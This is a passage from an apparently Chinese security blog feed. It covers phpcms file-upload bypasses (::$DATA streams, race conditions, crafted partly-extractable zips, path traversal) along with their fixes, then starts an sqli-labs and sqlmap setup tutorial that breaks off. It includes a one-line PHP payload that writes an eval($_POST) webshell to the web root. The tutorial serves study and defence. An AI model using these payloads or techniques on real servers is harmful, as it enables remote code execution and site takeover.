class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>”，因为“</mtext><mi>s</mi><mi>a</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi mathvariant=\"normal\">.</mi><mi>t</mi><mi>x</mi><mi>t</mi><mtext>”是文件名，“</mtext></mrow><annotation encoding=\"application/x-tex\">DATA”，因为“sample.txt”是文件名，“</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord\">”</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">因</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord\">“</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">”</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord\">“</span></span></span></span>DATA” 是流类型</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">------<span class=\"title class_\">WebKitFormBoundaryaaRARrn2LBvpvcwK</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Disposition</span>: form-data; name=<span class=\"string\">&quot;file&quot;</span>; filename=<span class=\"string\">&#x27;DataStreamTest.php::$DATA&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Type</span>: image/jpeg</span><br></pre></td></tr></table></figure>\n<p>成功上传后缀为 php 的文件</p>\n<h2 id=\"phpcms文件上传四次绕过\"><a class=\"markdownIt-Anchor\" href=\"#phpcms文件上传四次绕过\">#</a> phpcms 文件上传四次绕过</h2>\n<p>1. 只能上传压缩文件，上传后解压，判断文件后缀，删除非法文件</p>\n<p>没有递归删除文件，导致可以构造文件夹，文件夹中放非法文件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function check_dir($<span class=\"built_in\">dir</span>)&#123;</span><br><span class=\"line\">    $handle = opendir($<span class=\"built_in\">dir</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(($f = readdir($handle)) !== false)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!in_array($f, array(<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"string\">&#x27;..&#x27;</span>)))&#123;</span><br><span class=\"line\">            $ext = strtolower(substr(strrchr($f, <span class=\"string\">&#x27;.&#x27;</span>), <span class=\"number\">1</span>));</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!in_array($ext, array(<span class=\"string\">&#x27;jpg&#x27;</span>, <span class=\"string\">&#x27;gif&#x27;</span>, <span class=\"string\">&#x27;png&#x27;</span>)))&#123;</span><br><span class=\"line\">                unlink($<span class=\"built_in\">dir</span>.$f);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>修复：递归删除</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//递归删除</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_dir</span>(<span class=\"params\"><span class=\"variable\">$dir</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$handle</span> = <span class=\"title function_ invoke__\">opendir</span>(<span class=\"variable\">$dir</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((<span class=\"variable\">$f</span> = <span class=\"title function_ invoke__\">readdir</span>(<span class=\"variable\">$handle</span>)) !== <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$f</span>, <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"string\">&#x27;..&#x27;</span>)))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"variable\">$dir</span>.<span class=\"variable\">$f</span>))&#123;</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">check_dir</span>(<span class=\"variable\">$dir</span>.<span class=\"variable\">$f</span>.<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">             &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"variable\">$ext</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$f</span>, <span class=\"string\">&#x27;.&#x27;</span>), <span class=\"number\">1</span>));</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$ext</span>, <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>, <span class=\"string\">&#x27;gif&#x27;</span>, <span class=\"string\">&#x27;png&#x27;</span>)))&#123;</span><br><span class=\"line\">                    <span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$dir</span>.<span class=\"variable\">$f</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>2. 先解压再删除，条件竞争，通过上传后没有删除的短暂时间内访问该文件，在该文将上一级目录写马</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(in_array($ext, array(<span class=\"string\">&#x27;zip&#x27;</span>, <span class=\"string\">&#x27;jpg&#x27;</span>, <span class=\"string\">&#x27;gif&#x27;</span>, <span class=\"string\">&#x27;png&#x27;</span>)))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($ext == <span class=\"string\">&#x27;zip&#x27;</span>)&#123;</span><br><span class=\"line\">        $archive = new PclZip($file[<span class=\"string\">&#x27;tmp_name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">               exit(<span class=\"string\">&quot;解压失败&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        check_dir($<span class=\"built_in\">dir</span>);</span><br><span class=\"line\">        exit(<span class=\"string\">&#x27;上传成功!&#x27;</span>);</span><br></pre></td></tr></table></figure>\n<p>通过 BP 一边一直上传，一边一直访问上传文件，上传的文件使用 fputs 在上级写马</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php fputs(fopen(<span class=\"string\">&#x27;../../../../../shell.php&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>),<span class=\"string\">&#x27;&lt;?php phpinfo();eval($_POST[a]);?&gt;&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>\n<p>修复：通过上传文件夹名为随机文件名来禁止访问</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!is_dir($<span class=\"built_in\">dir</span>))&#123;</span><br><span class=\"line\">    mkdir($<span class=\"built_in\">dir</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">$temp_dir = $<span class=\"built_in\">dir</span>.md5(time(). rand(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>));</span><br><span class=\"line\">$temp_dir = $<span class=\"built_in\">dir</span>.<span class=\"string\">&#x27;member/1/&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!is_dir($temp_dir))&#123;</span><br></pre></td></tr></table></figure>\n<p>3. 通过解压失败直接退出绕过。构造可以解压一半的压缩包，把木马解压后再失败退出。目录通过右键查看图片链接获得</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">       exit(<span class=\"string\">&quot;解压失败&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修复：退出之前递归删除</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">       check_dir($<span class=\"built_in\">dir</span>);</span><br><span class=\"line\">       exit(<span class=\"string\">&quot;解压失败&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这边详细讲一下怎么构造只能解压一部分的压缩包</p>\n<ol>\n<li>使用 Windows 下的 7zip</li>\n</ol>\n<p>修改压缩包里文件的 CRC 校验码</p>\n<p>先准备两个文件，一个 PHP 文件 1.php，一个文本文件 2.txt，其中 1.php 是 webshell。然后将这两个文件压缩成 shell.zip。 然后我们用 010editor 打开 shell.zip，可以看到右下角有这个文件的格式信息，它被分成 5 部分，如图 1。我们打开第 4 部分，其中有个 deCrc，我们随便把值改成其他的值，然后保存。</p>\n<ol start=\"2\">\n<li>使用 PHP 自带的 ZipArchive 库</li>\n</ol>\n<p>Windows 下不允许文件名中包含冒号（:），我们就可以在 010editor 中将 2.txt 的 deFileName 属性的值改成 “2.tx:”</p>\n<p>在 Linux 下也有类似的方法，我们可以将文件名改成 5 个斜杠（/////）</p>\n<p>4. 把压缩包中某文件名改成…/…/…/…/…/index.php，解压后文件直接到网站根目录</p>\n<p>注意修改文件名后文件名长度不变</p>\n<p>5. 通过验证文件名中不包含 <code>../</code>  并且文件名需要为 jpg</p>\n<p>通过构造 1.php;1.jpg</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foreach ($content <span class=\"keyword\">as</span> $t) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (strpos($t[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;..&#x27;</span>) !== FALSE ||</span><br><span class=\"line\">                strpos($t[<span class=\"string\">&#x27;filename&#x27;</span>], <span class=\"string\">&#x27;..&#x27;</span>) !== FALSE ||</span><br><span class=\"line\">                strpos($t[<span class=\"string\">&#x27;filename&#x27;</span>], <span class=\"string\">&#x27;/&#x27;</span>) !== FALSE ||</span><br><span class=\"line\">                strpos($t[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;/&#x27;</span>) !== FALSE) &#123;</span><br><span class=\"line\"><span class=\"meta\">                @unlink(<span class=\"params\">$filename</span>);</span></span><br><span class=\"line\">                exit(function_exists(<span class=\"string\">&#x27;iconv&#x27;</span>) ? iconv(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;非法名称的文件&#x27;</span>) : <span class=\"string\">&#x27;llegal name file&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (substr(strrchr($t[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;.&#x27;</span>), <span class=\"number\">1</span>) != <span class=\"string\">&#x27;jpg&#x27;</span>) &#123;</span><br><span class=\"line\"><span class=\"meta\">                @unlink(<span class=\"params\">$filename</span>);</span></span><br><span class=\"line\">                exit(function_exists(<span class=\"string\">&#x27;iconv&#x27;</span>) ? iconv(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;文件格式校验不正确&#x27;</span>) : <span class=\"string\">&#x27;The document format verification is not correct&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>6. 正确的防御方法：<br>\n把压缩包放进 tmp 目录里，如果上传、解压缩的操作都能在 tmp 目录里完成，再把我们需要的头像文件拷贝到 web 目录中</p>\n<p>7. 附上最后一版的防御代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 大众版头像上传处理 2014-6-15</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;iconv&#x27;</span>) ? <span class=\"title function_ invoke__\">iconv</span>(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;环境不支持&#x27;</span>) : <span class=\"string\">&#x27;The php does not support&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 创建图片存储文件夹</span></span><br><span class=\"line\">        <span class=\"variable\">$dir</span> = FCPATH.<span class=\"string\">&#x27;member/uploadfile/member/&#x27;</span>.<span class=\"variable language_\">$this</span>-&gt;uid.<span class=\"string\">&#x27;/&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">file_exists</span>(<span class=\"variable\">$dir</span>)) &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">mkdir</span>(<span class=\"variable\">$dir</span>, <span class=\"number\">0777</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$filename</span> = <span class=\"variable\">$dir</span>.<span class=\"string\">&#x27;avatar.zip&#x27;</span>; <span class=\"comment\">// 存储flashpost图片</span></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"variable\">$filename</span>, <span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&#x27;HTTP_RAW_POST_DATA&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"comment\">// 解压缩文件</span></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;load-&gt;<span class=\"title function_ invoke__\">library</span>(<span class=\"string\">&#x27;Pclzip&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;pclzip-&gt;<span class=\"title function_ invoke__\">PclFile</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">        <span class=\"variable\">$content</span> = <span class=\"variable language_\">$this</span>-&gt;pclzip-&gt;<span class=\"title function_ invoke__\">listContent</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"variable\">$content</span>) &#123;</span><br><span class=\"line\">            @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;iconv&#x27;</span>) ? <span class=\"title function_ invoke__\">iconv</span>(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;文件已损坏&#x27;</span>) : <span class=\"string\">&#x27;The file has damaged&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 验证文件</span></span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$content</span> <span class=\"keyword\">as</span> <span class=\"variable\">$t</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;..&#x27;</span>) !== <span class=\"literal\">FALSE</span> ||</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;filename&#x27;</span>], <span class=\"string\">&#x27;..&#x27;</span>) !== <span class=\"literal\">FALSE</span> ||</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;filename&#x27;</span>], <span class=\"string\">&#x27;/&#x27;</span>) !== <span class=\"literal\">FALSE</span> ||</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;/&#x27;</span>) !== <span class=\"literal\">FALSE</span>) &#123;</span><br><span class=\"line\">                @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">                <span class=\"keyword\">exit</span>(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;iconv&#x27;</span>) ? <span class=\"title function_ invoke__\">iconv</span>(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;非法名称的文件&#x27;</span>) : <span class=\"string\">&#x27;llegal name file&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;.&#x27;</span>), <span class=\"number\">1</span>) != <span class=\"string\">&#x27;jpg&#x27;</span>) &#123;</span><br><span class=\"line\">                @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">                <span class=\"keyword\">exit</span>(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;iconv&#x27;</span>) ? <span class=\"title function_ invoke__\">iconv</span>(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;文件格式校验不正确&#x27;</span>) : <span class=\"string\">&#x27;The document format verification is not correct&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 解压文件</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;pclzip-&gt;<span class=\"title function_ invoke__\">extract</span>(PCLZIP_OPT_PATH, <span class=\"variable\">$dir</span>, PCLZIP_OPT_REPLACE_NEWER) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            @<span class=\"title function_ invoke__\">dr_dir_delete</span>(<span class=\"variable\">$dir</span>);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"variable language_\">$this</span>-&gt;pclzip-&gt;<span class=\"title function_ invoke__\">zip</span>(<span class=\"literal\">true</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_file</span>(<span class=\"variable\">$dir</span>.<span class=\"string\">&#x27;45x45.jpg&#x27;</span>) || !<span class=\"title function_ invoke__\">is_file</span>(<span class=\"variable\">$dir</span>.<span class=\"string\">&#x27;90x90.jpg&#x27;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"string\">&#x27;文件创建失败&#x27;</span>);</span><br><span class=\"line\">        &#125;  </span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "File upload"
            ]
        },
        {
            "id": "http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/",
            "title": "SQL injection",
            "date_published": "2022-03-16T05:38:45.000Z",
            "content_html": "<h1 id=\"sql注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h3 id=\"1sqli-labs-master-安装\"><a class=\"markdownIt-Anchor\" href=\"#1sqli-labs-master-安装\">#</a> 1.sqli-labs-master 安装</h3>\n<p>下面在 linux 中安装，虚拟机地址为 192.168.1.155，端口号为 18888，使用宝塔面板</p>\n<h4 id=\"1将sqli-labs-master移动到网站根目录下解压\"><a class=\"markdownIt-Anchor\" href=\"#1将sqli-labs-master移动到网站根目录下解压\">#</a> 1. 将 sqli-labs-master 移动到网站根目录下，解压</h4>\n<p><code>unzip sqli-labs-master</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469835321-5363494e-a8b7-4796-99a0-97f475cef370.png\" alt=\"img\"></p>\n<h4 id=\"2修改配置文件配合文件为sqlisql-connectionsdb-credsinc\"><a class=\"markdownIt-Anchor\" href=\"#2修改配置文件配合文件为sqlisql-connectionsdb-credsinc\">#</a> 2. 修改配置文件，配合文件为： <code>sqli/sql-connections/db-creds.inc</code></h4>\n<p><code>vim sqli/sql-connections/db-creds.inc</code></p>\n<p>数据库用户名和密码在宝塔面板中可以修改</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469904204-6c29948a-2cdc-4f11-8e01-58f8ed2dbe83.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469999346-dca351bf-b5d0-4a51-9ff1-dab559edf120.png\" alt=\"img\"></p>\n<h4 id=\"3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行\"><a class=\"markdownIt-Anchor\" href=\"#3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行\">#</a> 3. 浏览器打开，输入对应的文件路径，安装数据库，如果第二步有错，此步将不能正常执行</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470033800-7e58d43a-1835-4303-906c-05a0d03dd762.png\" alt=\"img\"></p>\n<h4 id=\"4验证安装完成后即可按到如下界面\"><a class=\"markdownIt-Anchor\" href=\"#4验证安装完成后即可按到如下界面\">#</a> 4. 验证安装完成后，即可按到如下界面</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470107086-065656d0-7044-4c09-9323-5e799f726534.png\" alt=\"img\"></p>\n<h3 id=\"2sqlmap-安装与使用\"><a class=\"markdownIt-Anchor\" href=\"#2sqlmap-安装与使用\">#</a> 2.sqlmap 安装与使用</h3>\n<h4 id=\"1kali联网\"><a class=\"markdownIt-Anchor\" href=\"#1kali联网\">#</a> 1.kali 联网</h4>\n<p>选择桥接时，只需要将虚拟机和物理主机 ip 置于一个网段中</p>\n<p>如果不能联网，修改 <code>/etc/network/interfaces</code>   ，设置 ip，网关，掩码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> /etc/network/interfaces.d/*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The loopback network interface**</span></span><br><span class=\"line\">auto lo</span><br><span class=\"line\">iface lo inet loopback</span><br><span class=\"line\"></span><br><span class=\"line\">auto eth0</span><br><span class=\"line\"></span><br><span class=\"line\">iface eth0 inet static</span><br><span class=\"line\">address 192.168.0.66</span><br><span class=\"line\">gateway 192.168.1.1</span><br><span class=\"line\">netmask 255.255.254.0</span><br></pre></td></tr></table></figure>\n<h4 id=\"2修改dns-etcresolvconf\"><a class=\"markdownIt-Anchor\" href=\"#2修改dns-etcresolvconf\">#</a> 2. 修改 DNS，  <code>/etc/resolv.conf</code></h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nameserver 8.8.8.8</span><br><span class=\"line\">nameserver 114.114.114.114</span><br><span class=\"line\">search localdomain</span><br></pre></td></tr></table></figure>\n<h4 id=\"3重启网络服务\"><a class=\"markdownIt-Anchor\" href=\"#3重启网络服务\">#</a> 3. 重启网络服务</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/init.d/networking restart</span><br><span class=\"line\"></span><br><span class=\"line\">service networking restart </span><br></pre></td></tr></table></figure>\n<h4 id=\"4sqlmap使用\"><a class=\"markdownIt-Anchor\" href=\"#4sqlmap使用\">#</a> 4.sqlmap 使用</h4>\n<p>下载：Github：<span class=\"exturl\" 